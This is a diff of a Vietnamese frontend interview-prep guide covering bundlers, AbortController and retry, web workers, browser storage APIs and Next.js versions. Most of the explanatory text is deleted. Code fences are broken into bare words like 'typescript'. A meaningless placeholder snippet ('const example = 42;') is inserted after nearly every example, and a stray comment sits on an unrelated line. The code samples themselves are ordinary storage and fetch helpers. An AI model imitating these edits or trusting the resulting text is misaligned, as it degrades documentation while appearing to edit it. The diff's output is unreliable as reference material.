  // Chú giải: Tree-shaking hints
   "sideEffects": false
 }
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**🎯 Best Practices:**
-
-1. **Use ESM for new projects**: Better tooling, tree-shaking, future-proof
-2. **Mark side-effects**: Set `"sideEffects": false` trong package.json nếu possible
-3. **Code splitting strategy**: Route-based > Component-based > Manual
-4. **Bundle size monitoring**: Use tools như webpack-bundle-analyzer
-5. **Source maps**: Always generate cho production debugging
-6. **External dependencies**: Don't bundle large libraries (React, Lodash) - load từ CDN
-7. **Dynamic imports**: Use cho features hiếm dùng, route-based loading
-8. **ESBuild for speed**: 10-100x faster than Webpack, perfect for large projects
-9. **Preload critical chunks**: Use `<link rel="modulepreload">` cho important modules
-10. **CDN với ESM**: Use ESM-compatible CDNs như Skypack, jsDelivr
-
-**⚠️ Common Mistakes:**
-
-```typescript
+typescript
  // Chú giải: ❌ Sai: Mixing require trong ESM
 import React from 'react';
 const lodash = require('lodash'); // Chú giải: Error trong ESM!
@@ -14454,11 +7653,13 @@ export default { a };
 <script type="module">
   import lib from 'https: // Chú giải: cdn.skypack.dev/lib'; // Works!
 </script>
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**📊 Performance Comparison:**
-
-```typescript
+typescript
  // Chú giải: Bundler speed comparison (1000 modules):
  // Chú giải: - esbuild: ~0.5s ⚡ (Go-based, parallel)
  // Chú giải: - Rollup: ~5s (JavaScript, good tree-shaking)
@@ -14469,93 +7670,13 @@ export default { a };
  // Chú giải: - ESM only: 100KB (best tree-shaking)
  // Chú giải: - ESM + CJS mixed: 150KB (some dead code)
  // Chú giải: - CJS only: 200KB (no tree-shaking)
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**🎯 Use Cases:**
-
-- **ESM Native (no bundler)**: Prototypes, small apps, HTTP/2
-- **ESBuild**: Large apps cần fast builds, TypeScript projects
-- **Rollup**: Libraries cần best tree-shaking
-- **Webpack**: Complex apps với nhiều loaders/plugins
-- **Vite**: Development với ESM native, production với Rollup
----
-## 28. ⏹️ Q28: Cancellation, Concurrency & Retry  
-
-**P1: Tên câu hỏi:** ⏹️ Q28: Cancellation, Concurrency & Retry  
-
-**P2: Trả lời (Senior):**
-
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
-
-### **🎯 Câu Trả Lời Ngắn Gọn (3-4 phút):**
-
-**"Cancellation dùng AbortController để hủy requests, Concurrency control giới hạn parallel tasks, Retry implement exponential backoff cho failed requests."**
-
-**🔑 3 Pattern Chính:**
-
-**1. Cancellation - AbortController:**
-- `const controller = new AbortController(); fetch(url, {signal: controller.signal})`
-- **`controller.abort()`** hủy request → throw `AbortError`
-- Use case: User navigate away, timeout, duplicate requests
-- Best practice: Lan truyền `signal` xuyên suốt async chain
-
-**2. Concurrency Control - Semaphore Pattern:**
-- **Giới hạn số tasks chạy đồng thời** (ví dụ: max 5 parallel requests)
-- Pattern: Queue + counter, chờ slot trống để chạy task tiếp
-- Use case: Rate limiting, prevent overload server/browser
-- Libraries: `p-limit`, `p-queue` (production-ready)
-
-**3. Retry - Exponential Backoff + Jitter:**
-- **Retry lỗi tạm thời** (5xx, network errors), không retry 4xx
-- Exponential backoff: `delay = baseDelay * 2^attempt` (100ms, 200ms, 400ms...)
-- **Jitter** (random noise): tránh "thundering herd" (nhiều clients retry cùng lúc)
-- Max attempts + total timeout để không retry vô hạn
-
-**⚠️ Lỗi Thường Gặp:**
-- Không cleanup AbortController khi unmount → memory leak
-- Retry **mọi lỗi** (kể cả 4xx) → spam server, waste resources
-- Concurrency limit quá thấp → chậm, quá cao → overload
-- Không cancel previous search request → race condition (results out of order)
-
-**💡 Kiến Thức Senior:**
-- **Idempotent requests**: Retry an toàn cho GET/PUT, cẩn thận với POST (dùng idempotency keys)
-- **Circuit Breaker pattern**: Dừng hẳn requests sau N failures liên tiếp, chờ recover
-- **`AbortSignal.timeout(ms)`** (native) thay `setTimeout + abort`
-- **Stale-While-Revalidate**: Return cached data ngay, fetch mới background, update sau
-- React Query/SWR **built-in** retry + cancellation + concurrency control
-
-
-
-
-**Trả lời:****
-
-- Hủy bỏ: `AbortController/AbortSignal` cho fetch/task dài; truyền `signal` xuyên suốt để hủy chuỗi async.
-- Giới hạn đồng thời: dùng semaphore/pool để kiểm soát số tác vụ chạy song song, tránh nghẽn băng thông hay quota.
-- Retry: áp dụng backoff + jitter cho lỗi tạm thời, kèm tổng timeout để không treo vô hạn.
-
-Hoạt động:
-
-- Abort: `controller.abort()` phát tín hiệu; fetch/reader/listener có `signal` sẽ throw DOMException('AbortError') và dừng sớm.
-- Concurrency: hàng đợi đợi slot trống; xong 1 tác vụ thì phát tín hiệu cho tác vụ kế.
-- Retry: vòng lặp bắt lỗi, đợi theo backoff (exponential + jitter), dừng khi đạt số lần tối đa.
-
-Ưu điểm:
-
-- Chủ động dừng tác vụ thừa (chuyển trang, đóng modal).
-- Giảm tải server/trình duyệt, tránh bão request.
-- Tăng độ tin cậy khi mạng không ổn định.
-
-Nhược điểm:
-
-- Cần lan truyền `signal` qua nhiều lớp API.
-- Retry sai loại lỗi có thể tệ hơn (spam server).
-- Tối ưu concurrency không đúng ngữ cảnh vẫn có thể nghẽn.
-
-Chú thích: Chỉ retry lỗi tạm thời (5xx, ECONNRESET); không retry 4xx trừ khi có lý do rõ ràng.
-
-**Code Example:**
-
-```ts
+ts
  // Chú giải: 1) Abort fetch với timeout
 function fetchWithTimeout(url: string, ms = 5000) {
   const ctrl = new AbortController();
@@ -14596,79 +7717,21 @@ async function retry<T>(op: () => Promise<T>, tries = 3) {
     }
   }
 }
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**Best Practices:**
-
-- Truyền `signal` xuyên suốt chain APIs để hủy gọn
-- Đặt timeout tổng; đo và điều chỉnh max concurrency theo tài nguyên
-- Chỉ retry cho lỗi tạm thời (5xx, network)
-
-**Mistakes:**
-
-```ts
+ts
 // ❌ Retry vô hạn, không jitter → dồn tải (thundering herd)
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
----
-## 29. 👷 Q29: Web Workers, Service Worker & Background processesing & Share Worker  
 
-**P1: Tên câu hỏi:** 👷 Q29: Web Workers, Service Worker & Background processesing & Share Worker  
-
-**P2: Trả lời (Senior):**
-
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
-
-### **🎯 Câu Trả Lời Ngắn Gọn (3-4 phút):**
-
-**"Web Workers chạy JavaScript parallel không block UI, Service Workers proxy network requests cho offline PWA, Shared Workers share giữa tabs."**
-
-**🔑 3 Loại Workers:**
-
-**1. Web Worker (Dedicated Worker):**
-- Chạy **background thread** riêng, không access DOM
-- Communication: **`postMessage()` + `onmessage`**
-- Use case: Heavy computations (image processing, large data parsing, crypto)
-- Transferable objects (ArrayBuffer) cho performance cao
-
-**2. Service Worker:**
-- **Proxy network requests**, cache resources cho offline
-- Lifecycle: install → activate → fetch intercept
-- **Cần HTTPS** (trừ localhost), scope-based (control URLs in folder)
-- Use case: PWA (offline support), background sync, push notifications
-
-**3. Shared Worker:**
-- **Share state giữa multiple tabs/windows** cùng origin
-- Communication qua MessagePort
-- Use case: Shared WebSocket connection, centralized state management
-
-**⚠️ Lỗi Thường Gặp:**
-- Dùng DOM APIs trong Worker → **KHÔNG có** `window`, `document`
-- Gửi large objects với `postMessage` → chậm (clone overhead), dùng **Transferable** thay vì
-- Service Worker cache không version → stale data, dùng cache versioning
-- Quên `self.skipWaiting()` → SW mới không activate ngay
-
-**💡 Kiến Thức Senior:**
-- **Transferable Objects**: `postMessage(data, [data.buffer])` → **zero-copy** transfer (nhanh hơn structured clone)
-- **Service Worker strategies**:
-  - **Cache First**: Offline-first (cache → network fallback)
-  - **Network First**: Fresh data priority (network → cache fallback)
-  - **Stale-While-Revalidate**: Instant response (cache) + background update
-- **Workbox** (Google): Production-ready SW library với precaching, routing, strategies
-- **SharedArrayBuffer** cho shared memory giữa workers (cần COOP/COEP headers)
-- Module Workers: `new Worker('worker.js', {type: 'module'})` - support ES6 imports
-
-
-
-
-**Trả lời:****
-
-- Web Worker: chạy song song, không truy cập DOM
-- Service Worker: proxy network, cache offline, cần HTTPS/origin chuẩn
-- PWA: manifest + SW + HTTPS
-
-**Code Example:**
-
-```ts
+ts
  // Chú giải: worker.ts
 self.onmessage = (e) => {
   const n: number = e.data;
@@ -14687,92 +7750,20 @@ self.addEventListener('install', (e) => {
 self.addEventListener('fetch', (e) => {
   e.respondWith(caches.match(e.request).then((r) => r || fetch(e.request)));
 });
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**Best Practices:**
-
-- Worker: truyền dữ liệu nhỏ/gọn; dùng transferable (ArrayBuffer) cho hiệu năng
-- SW: version cache, chiến lược network (Stale-While-Revalidate, CacheFirst,...)
-
-**Mistakes:**
-
-```ts
+ts
 // ❌ Dùng DOM API bên trong Worker → không có sẵn
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
----
-## 30. 💽 Q30: Browser Storage - LocalStorage, SessionStorage, Cookie & IndexedDB  
 
-**P1: Tên câu hỏi:** 💽 Q30: Browser Storage - LocalStorage, SessionStorage, Cookie & IndexedDB  
-
-**P2: Trả lời (Senior):**
-
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
-
-### **🎯 Câu Trả Lời Ngắn Gọn (3-4 phút):**
-
-**"Browser có 4 storage options: Cookie (4KB, gửi server), LocalStorage (5-10MB, persistent), SessionStorage (5-10MB, tab-scoped), IndexedDB (50MB+, async database)."**
-
-**🔑 So Sánh 4 Loại Storage:**
-
-| **Tiêu Chí** | **Cookie** | **LocalStorage** | **SessionStorage** | **IndexedDB** |
-|-------------|-----------|-----------------|-------------------|---------------|
-| **Dung lượng** | 4KB | 5-10MB | 5-10MB | 50MB-unlimited |
-| **Tồn tại** | Expiry date | Mãi mãi | Đóng tab mất | Mãi mãi |
-| **API** | Sync (string) | Sync (string) | Sync (string) | **Async** |
-| **Gửi server** | ✅ Auto | ❌ Không | ❌ Không | ❌ Không |
-| **Use Case** | Auth tokens | Settings | Form data | Large datasets |
-
-**🔑 Chi Tiết Từng Loại:**
-
-**1. Cookie:**
-- **Tự động gửi** kèm mọi HTTP request → dùng cho authentication
-- Flags: `HttpOnly` (JS không đọc), `Secure` (chỉ HTTPS), `SameSite` (CSRF protection)
-- Tốn bandwidth (gửi mọi request) → giữ nhỏ
-
-**2. LocalStorage:**
-- **Persistent** (không mất khi đóng tab), **synchronous API**
-- Use case: User preferences, theme, language, cached data
-- ⚠️ KHÔNG dùng cho sensitive data (không encrypt, XSS vulnerable)
-
-**3. SessionStorage:**
-- **Tab-scoped** (mỗi tab riêng biệt), mất khi đóng tab
-- Use case: Form wizards, temporary shopping cart, session-specific state
-- Duplicate tab = duplicate sessionStorage (không share)
-
-**4. IndexedDB:**
-- **Async database** (transactions, indexes, queries)
-- Store **objects, files, blobs** (không chỉ strings)
-- Use case: Offline apps, large datasets, binary files (images, videos)
-- Libraries: Dexie.js, localForage (simplified API)
-
-**⚠️ Lỗi Thường Gặp:**
-- Lưu sensitive data (tokens) vào localStorage → **XSS attack** đọc được, dùng `HttpOnly` cookies thay vì
-- Stringify/parse mỗi lần access localStorage → performance issue, cache parsed value
-- Không handle `QuotaExceededError` → app crash khi storage đầy
-- Dùng IndexedDB synchronously (blocking API) → dùng promises/async
-
-**💡 Kiến Thợc Senior:**
-- **Security**: Tokens trong `HttpOnly + Secure + SameSite=Strict` cookies, không localStorage
-- **Storage events**: `window.addEventListener('storage')` để sync giữa tabs (chỉ localStorage)
-- **Quota API**: `navigator.storage.estimate()` check available space
-- **Cache API** (Service Workers): Khác localStorage, dùng cho HTTP responses caching
-- Performance: localStorage **blocking I/O** → avoid trong hot paths, dùng in-memory cache
-
-
-
-
-**Trả lời:****
-
-Browser cung cấp **4 cách lưu trữ data** ở client-side, mỗi cách phù hợp cho use case khác nhau:
-
-- **Cookie**: Nhỏ (4KB), gửi kèm mỗi HTTP request, có expiry, dùng cho auth tokens
-- **LocalStorage**: 5-10MB, persistent (không mất khi đóng tab), sync API, dùng cho settings/preferences
-- **SessionStorage**: 5-10MB, mất khi đóng tab, sync API, dùng cho temporary data
-- **IndexedDB**: 50MB-unlimited, async, database-like, dùng cho large datasets
-
-#### **📊 So Sánh 4 Loại Storage**
-
-```
 ┌────────────────────────────────────────────────────────────────────────┐
 │                    BROWSER STORAGE COMPARISON                          │
 ├────────────────────────────────────────────────────────────────────────┤
@@ -14792,31 +7783,13 @@ Browser cung cấp **4 cách lưu trữ data** ở client-side, mỗi cách phù
 │  📝 SessionStorage: Như giấy nháp (hết giờ là vứt)                    │
 │  🗄️ IndexedDB:     Như kho chứa lớn (chứa cả thùng hàng)             │
 └────────────────────────────────────────────────────────────────────────┘
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-#### **🍪 1. Cookie - "Tem Dán Lên Mọi Request"**
-
-**Đặc điểm:**
-- Dung lượng nhỏ: **4KB** (chỉ lưu được text ngắn)
-- Tự động gửi kèm **mọi HTTP request** tới server
-- Có **expiry date** (tự động xóa sau thời gian)
-- Dùng cho: **Authentication tokens, user tracking**
-
-**Ưu điểm:**
-- ✅ Server tự động nhận (không cần JS)
-- ✅ Có expiry (tự động dọn dẹp)
-- ✅ Secure flag (HTTPS only), HttpOnly (JS không đọc được)
-
-**Nhược điểm:**
-- ❌ Nhỏ (4KB) - không lưu nhiều
-- ❌ Tốn bandwidth (gửi kèm mọi request)
-- ❌ Phức tạp hơn localStorage
-
-**Code Example:**
-
-```typescript
+typescript
  // Chú giải: ============================================
 // COOKIE - Ví Dụ Đơn Giản
  // Chú giải: ============================================
@@ -14826,7 +7799,7 @@ function setCookie(name: string, value: string, days: number = 7) {
   const date = new Date();
   date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000); // Tính expiry
   const expires = `expires=${date.toUTCString()}`;
-  
+
  // Chú giải: Lưu cookie
   document.cookie = `${name}=${value}; ${expires}; path=/; SameSite=Strict`;
   // path=/     → cookie có hiệu lực toàn site
@@ -14840,12 +7813,12 @@ setCookie('authToken', 'abc123xyz', 7); // Hết hạn sau 7 ngày
 function getCookie(name: string): string | null {
  // Chú giải: document.cookie = "authToken=abc123; userId=456; theme=dark"
   const cookies = document.cookie.split('; ');
-  
+
   for (const cookie of cookies) {
     const [key, value] = cookie.split('=');
     if (key === name) return value;
   }
-  
+
   return null; // Không tìm thấy
 }
 
@@ -14870,7 +7843,7 @@ class CookieManager {
     const expires = new Date(Date.now() + days * 864e5).toUTCString();
     document.cookie = `${name}=${value}; expires=${expires}; path=/; SameSite=Strict`;
   }
-  
+
  // Chú giải: Get cookie
   static get(name: string): string | null {
     return document.cookie
@@ -14878,7 +7851,7 @@ class CookieManager {
       .find(row => row.startsWith(name + '='))
       ?.split('=')[1] || null;
   }
-  
+
  // Chú giải: Delete cookie
   static delete(name: string): void {
     document.cookie = `${name}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;
@@ -14889,31 +7862,13 @@ class CookieManager {
 CookieManager.set('user', 'John', 30); // Lưu 30 ngày
 const user = CookieManager.get('user'); // Chú giải: "John"
 CookieManager.delete('user'); // Xóa
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-#### **💾 2. LocalStorage - "USB Drive - Lưu Mãi Mãi"**
-
-**Đặc điểm:**
-- Dung lượng lớn: **5-10MB** (tuỳ browser)
-- **Persistent** - không mất khi đóng tab/browser
-- **Sync API** - dễ dùng
-- Dùng cho: **User settings, preferences, cache data**
-
-**Ưu điểm:**
-- ✅ Dễ dùng (getItem/setItem)
-- ✅ Lưu mãi mãi (không tự xóa)
-- ✅ Dung lượng lớn (5-10MB)
-
-**Nhược điểm:**
-- ❌ Sync API (block main thread nếu dùng nhiều)
-- ❌ Chỉ lưu string (phải JSON.stringify object)
-- ❌ Không secure (JS đọc được → XSS risk)
-
-**Code Example:**
-
-```typescript
+typescript
  // Chú giải: ============================================
 // LOCALSTORAGE - Ví Dụ Đơn Giản
  // Chú giải: ============================================
@@ -14975,7 +7930,7 @@ class LocalStorageHelper {
       console.error('LocalStorage set error:', error);
     }
   }
-  
+
   // Get data (tự động parse)
   static get<T>(key: string, defaultValue: T | null = null): T | null {
     try {
@@ -14986,12 +7941,12 @@ class LocalStorageHelper {
       return defaultValue;
     }
   }
-  
+
  // Chú giải: Remove item
   static remove(key: string): void {
     localStorage.removeItem(key);
   }
-  
+
  // Chú giải: Clear all
   static clear(): void {
     localStorage.clear();
@@ -15035,31 +7990,13 @@ document.getElementById('themeBtn')?.addEventListener('click', () => {
   const newTheme = current === 'light' ? 'dark' : 'light';
   saveTheme(newTheme);
 });
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-#### **📝 3. SessionStorage - "Giấy Nháp - Đóng Tab Là Mất"**
-
-**Đặc điểm:**
-- Dung lượng: **5-10MB** (giống localStorage)
-- **Mất khi đóng tab** (không persistent)
-- **Sync API** - giống localStorage
-- Dùng cho: **Form data, wizard steps, temporary state**
-
-**Ưu điểm:**
-- ✅ API giống localStorage (dễ học)
-- ✅ Tự động dọn dẹp (đóng tab = xóa)
-- ✅ Mỗi tab có storage riêng
-
-**Nhược điểm:**
-- ❌ Mất khi đóng tab (không persistent)
-- ❌ Không share giữa tabs
-- ❌ Sync API (block main thread)
-
-**Code Example:**
-
-```typescript
+typescript
  // Chú giải: ============================================
 // SESSIONSTORAGE - Ví Dụ Đơn Giản
  // Chú giải: ============================================
@@ -15096,18 +8033,18 @@ interface FormState {
 
 class FormWizard {
   private static KEY = 'wizardState';
-  
+
   // Lưu state hiện tại
   static saveState(state: FormState): void {
     sessionStorage.setItem(this.KEY, JSON.stringify(state));
   }
-  
+
   // Đọc state (auto-load khi refresh page)
   static loadState(): FormState | null {
     const data = sessionStorage.getItem(this.KEY);
     return data ? JSON.parse(data) : null;
   }
-  
+
   // Xóa state (sau khi submit)
   static clearState(): void {
     sessionStorage.removeItem(this.KEY);
@@ -15150,32 +8087,13 @@ sessionStorage.setItem('draft', JSON.stringify(formData)); // Mất khi đóng t
 // Scenario 4: Search filters (dùng sessionStorage)
 sessionStorage.setItem('filters', JSON.stringify(filters)); // Chú giải: Per-tab
 // → Mỗi tab có filter riêng, không conflict
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-#### **🗄️ 4. IndexedDB - "Kho Chứa Lớn - Database Trên Browser"**
-
-**Đặc điểm:**
-- Dung lượng: **50MB - unlimited** (chrome: 60% disk)
-- **Async API** - không block UI
-- **Database-like**: tables, indexes, queries, transactions
-- Dùng cho: **Large datasets, offline apps, caching**
-
-**Ưu điểm:**
-- ✅ Dung lượng lớn (GB nếu user cho phép)
-- ✅ Async (không block UI)
-- ✅ Indexes, queries (như SQL)
-- ✅ Transactions (ACID)
-
-**Nhược điểm:**
-- ❌ API phức tạp (callback hell)
-- ❌ Khó học
-- ❌ Overkill cho data nhỏ
-
-**Code Example:**
-
-```typescript
+typescript
  // Chú giải: ============================================
 // INDEXEDDB - Ví Dụ Đơn Giản (Simplified với Promise)
  // Chú giải: ============================================
@@ -15184,22 +8102,22 @@ sessionStorage.setItem('filters', JSON.stringify(filters)); // Chú giải: Per-
 function openDB(dbName: string, version: number = 1): Promise<IDBDatabase> {
   return new Promise((resolve, reject) => {
     const request = indexedDB.open(dbName, version);
-    
+
     // onupgradeneeded: Chạy khi tạo DB lần đầu hoặc upgrade version
     request.onupgradeneeded = (event) => {
       const db = (event.target as IDBOpenDBRequest).result;
-      
+
       // Tạo "table" (gọi là objectStore)
       if (!db.objectStoreNames.contains('users')) {
         const store = db.createObjectStore('users', { keyPath: 'id' });
         // keyPath: 'id' → dùng field 'id' làm primary key
-        
+
  // Chú giải: Tạo index (giống SQL index)
         store.createIndex('email', 'email', { unique: true });
         store.createIndex('name', 'name', { unique: false });
       }
     };
-    
+
     request.onsuccess = () => resolve(request.result);
     request.onerror = () => reject(request.error);
   });
@@ -15211,10 +8129,10 @@ async function addUser(db: IDBDatabase, user: any): Promise<void> {
  // Chú giải: Tạo transaction (như BEGIN TRANSACTION trong SQL)
     const tx = db.transaction('users', 'readwrite'); // readwrite = có thể ghi
     const store = tx.objectStore('users');
-    
+
     // Thêm data
     const request = store.add(user);
-    
+
     request.onsuccess = () => resolve();
     request.onerror = () => reject(request.error);
   });
@@ -15225,9 +8143,9 @@ async function getUser(db: IDBDatabase, id: number): Promise<any> {
   return new Promise((resolve, reject) => {
     const tx = db.transaction('users', 'readonly'); // readonly = chỉ đọc
     const store = tx.objectStore('users');
-    
+
     const request = store.get(id); // Tìm theo primary key
-    
+
     request.onsuccess = () => resolve(request.result);
     request.onerror = () => reject(request.error);
   });
@@ -15238,9 +8156,9 @@ async function getAllUsers(db: IDBDatabase): Promise<any[]> {
   return new Promise((resolve, reject) => {
     const tx = db.transaction('users', 'readonly');
     const store = tx.objectStore('users');
-    
+
     const request = store.getAll(); // Chú giải: Lấy tất cả
-    
+
     request.onsuccess = () => resolve(request.result);
     request.onerror = () => reject(request.error);
   });
@@ -15251,9 +8169,9 @@ async function updateUser(db: IDBDatabase, user: any): Promise<void> {
   return new Promise((resolve, reject) => {
     const tx = db.transaction('users', 'readwrite');
     const store = tx.objectStore('users');
-    
+
     const request = store.put(user); // put = thêm hoặc update
-    
+
     request.onsuccess = () => resolve();
     request.onerror = () => reject(request.error);
   });
@@ -15264,9 +8182,9 @@ async function deleteUser(db: IDBDatabase, id: number): Promise<void> {
   return new Promise((resolve, reject) => {
     const tx = db.transaction('users', 'readwrite');
     const store = tx.objectStore('users');
-    
+
     const request = store.delete(id);
-    
+
     request.onsuccess = () => resolve();
     request.onerror = () => reject(request.error);
   });
@@ -15278,25 +8196,25 @@ async function deleteUser(db: IDBDatabase, id: number): Promise<void> {
 async function demo() {
  // Chú giải: Mở database
   const db = await openDB('MyAppDB', 1);
-  
+
   // Thêm users
   await addUser(db, { id: 1, name: 'John', email: 'john@example.com' });
   await addUser(db, { id: 2, name: 'Jane', email: 'jane@example.com' });
-  
+
   // Đọc 1 user
   const user = await getUser(db, 1);
   console.log(user); // Chú giải: { id: 1, name: 'John', email: 'john@example.com' }
-  
+
   // Đọc tất cả users
   const users = await getAllUsers(db);
   console.log(users); // Chú giải: [{ id: 1, ... }, { id: 2, ... }]
-  
+
  // Chú giải: Update user
   await updateUser(db, { id: 1, name: 'John Doe', email: 'john@example.com' });
-  
+
   // Xóa user
   await deleteUser(db, 2);
-  
+
   // Đóng database
   db.close();
 }
@@ -15308,17 +8226,17 @@ demo();
  // Chú giải: ============================================
 class OfflineCache {
   private db: IDBDatabase | null = null;
-  
+
   async init() {
     this.db = await openDB('OfflineCache', 1);
   }
-  
+
  // Chú giải: Cache API response
   async cacheArticle(article: any) {
     if (!this.db) return;
     await addUser(this.db, article);
   }
-  
+
  // Chú giải: Get từ cache
   async getArticle(id: number) {
     if (!this.db) return null;
@@ -15336,13 +8254,13 @@ await cache.cacheArticle(article);
 
 // Offline: Đọc từ cache
 const cached = await cache.getArticle(1);
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-#### **🎯 Khi Nào Dùng Storage Nào?**
-
-```typescript
+typescript
  // Chú giải: ============================================
 // DECISION TREE - Chọn Storage Phù Hợp
  // Chú giải: ============================================
@@ -15352,22 +8270,22 @@ function selectStorage(requirement: Requirement): Storage {
   if (requirement.sendToServer) {
     return 'Cookie'; // Chú giải: Auth tokens, session IDs
   }
-  
+
  // Chú giải: 2. Data lớn (>5MB)? → IndexedDB
   if (requirement.size > 5_000_000) {
     return 'IndexedDB'; // Chú giải: Images, videos, large datasets
   }
-  
+
   // 3. Cần persistent (lưu mãi mãi)? → LocalStorage
   if (requirement.persistent) {
     return 'LocalStorage'; // Tham chiếu: biến chứa địa chỉ tới object trong heap; `const` khóa tham chiếu chứ không khóa nội dung object.
   }
-  
+
   // 4. Temporary (đóng tab = mất)? → SessionStorage
   if (requirement.temporary) {
     return 'SessionStorage'; // Chú giải: Form drafts, wizard steps
   }
-  
+
  // Chú giải: Default: LocalStorage
   return 'LocalStorage';
 }
@@ -15398,13 +8316,13 @@ function selectStorage(requirement: Requirement): Storage {
  // Chú giải: - Large datasets (1000+ items)
  // Chú giải: - Images, videos
  // Chú giải: - Full-text search indexes
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-#### **📋 Best Practices (Thực Hành Tốt)**
-
-```typescript
+typescript
 // 1️⃣ ALWAYS TRY-CATCH (storage có thể full hoặc disabled)
 function safeSetItem(key: string, value: any) {
   try {
@@ -15458,15 +8376,15 @@ function setVersionedData<T>(key: string, data: T, version: number = 1) {
 function getVersionedData<T>(key: string, currentVersion: number): T | null {
   const item = localStorage.getItem(key);
   if (!item) return null;
-  
+
   const wrapper: StorageData<T> = JSON.parse(item);
-  
+
   if (wrapper.version !== currentVersion) {
  // Chú giải: Migration logic here
     console.warn('Old data version, migrating...');
     return null;
   }
-  
+
   return wrapper.data;
 }
 
@@ -15487,15 +8405,15 @@ function setWithExpiry<T>(key: string, value: T, ttlMs: number) {
 function getWithExpiry<T>(key: string): T | null {
   const itemStr = localStorage.getItem(key);
   if (!itemStr) return null;
-  
+
   const item: CachedData<T> = JSON.parse(itemStr);
-  
+
  // Chú giải: Check expiry
   if (Date.now() > item.expiry) {
     localStorage.removeItem(key); // Expired, xóa đi
     return null;
   }
-  
+
   return item.data;
 }
 
@@ -15508,13 +8426,13 @@ if (cached) {
 } else {
   console.log('Cache expired, fetch new');
 }
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-#### **❌ Common Mistakes (Lỗi Thường Gặp)**
-
-```typescript
+typescript
 // ❌ LỖI 1: Lưu object trực tiếp (không stringify)
 localStorage.setItem('user', { name: 'John' }); // Chú giải: ❌ Lưu "[object Object]"
 
@@ -15570,262 +8488,29 @@ try {
 } finally {
   db.close(); // Chú giải: Always close
 }
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-#### **💡 Summary (Tóm Tắt)**
-
-**Cookie 🍪**
-- **4KB**, gửi kèm mọi request, có expiry
-- **Dùng cho**: Auth tokens, session IDs
-- **API**: `document.cookie`
-
-**LocalStorage 💾**
-- **5-10MB**, lưu mãi mãi, sync API
-- **Dùng cho**: Settings, preferences, cart
-- **API**: `localStorage.getItem/setItem`
-
-**SessionStorage 📝**
-- **5-10MB**, mất khi đóng tab, sync API
-- **Dùng cho**: Form drafts, temporary state
-- **API**: `sessionStorage.getItem/setItem`
-
-**IndexedDB 🗄️**
-- **50MB+**, async, database-like
-- **Dùng cho**: Large datasets, offline apps
-- **API**: `indexedDB.open`, transactions, objectStores
-
-**Key Takeaway:**
-- Data nhỏ + simple → **LocalStorage/SessionStorage**
-- Gửi server → **Cookie**
-- Data lớn + complex → **IndexedDB**
-- Luôn **try-catch**, **check availability**, **namespace keys**
-
----
----
-## 31. ⚡ Q31: Next.js Workflow & Version Comparison - Next.js 14 vs 15 vs 16  
-
-**P1: Tên câu hỏi:** ⚡ Q31: Next.js Workflow & Version Comparison - Next.js 14 vs 15 vs 16  
-
-**P2: Trả lời (Senior):**
-
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
-
-### **🎯 Câu Trả Lời Ngắn Gọn (4-5 phút):**
-
-**"Next.js workflow: File-based routing (App Router) → Rendering strategies (SSR/SSG/ISR) → Data fetching (Server Components) → Build optimization. Version evolution: v14 stable App Router, v15 React 19 + async APIs, v16 cache improvements."**
-
-**🔑 Next.js Workflow - 5 Bước:**
-
-**1. Routing - File-Based (App Router):**
-- `app/page.tsx` = homepage `/`
-- `app/blog/[slug]/page.tsx` = dynamic route `/blog/my-post`
-- `layout.tsx` = shared UI wrapper (persist across pages)
-- Route groups `(marketing)` không ảnh hưởng URL
-
-**2. Rendering Strategies:**
-- **SSR** (Server-Side Rendering): Render mỗi request, fresh data
-- **SSG** (Static Site Generation): Pre-render build time, fast CDN
-- **ISR** (Incremental Static Regeneration): SSG + revalidate background
-- **CSR** (Client-Side): Fetch data client-side (use client components)
-
-**3. Data Fetching:**
-- **Server Components** (default): `async` components fetch trên server
-- `fetch()` auto-cached, `revalidate` option cho ISR
-- **Client Components** (`'use client'`): dùng React Query, SWR, useEffect
-
-**4. Build & Deploy:**
-- `next build` → static HTML + optimized bundles
-- Vercel (zero-config), Docker, Node.js server
-- Edge Runtime cho ultra-low latency
-
-**5. Performance Optimizations:**
-- Automatic code splitting (per route)
-- Image optimization (`<Image />`), Font optimization
-- Route prefetching (`<Link />`)
-
-**🔑 Version Comparison:**
-
-| **Feature** | **Next.js 14** | **Next.js 15** | **Next.js 16** |
-|------------|---------------|---------------|---------------|
-| **React** | React 18 | **React 19** | React 19 |
-| **App Router** | Stable | Enhanced | Optimized |
-| **Key Feature** | Turbopack (beta), Server Actions stable | **Async Request APIs** (cookies/headers), Partial Prerendering | **Cache behavior changes**, DX improvements |
-| **Breaking** | - | `cookies()/headers()` giờ **async** | Default caching strategies changed |
-
-**⚠️ Lỗi Thường Gặp:**
-- Dùng `'use client'` không cần thiết → mất Server Component benefits (bundle size tăng)
-- Fetch data trong Client Components mà không cache → waterfall, chậm
-- Quên `revalidate` cho ISR → data stale mãi mãi
-- Mix Pages Router và App Router không hiểu middleware scope
-
-**💡 Kiến Thức Senior:**
-- **Server vs Client Components**: Server = zero JS to client, Client = interactivity (onClick, useState)
-- **Partial Prerendering** (v15): Combine static + dynamic trong cùng route (static shell + dynamic content)
-- **Turbopack** (v14+): Rust-based bundler nhanh hơn Webpack (~700x dev mode)
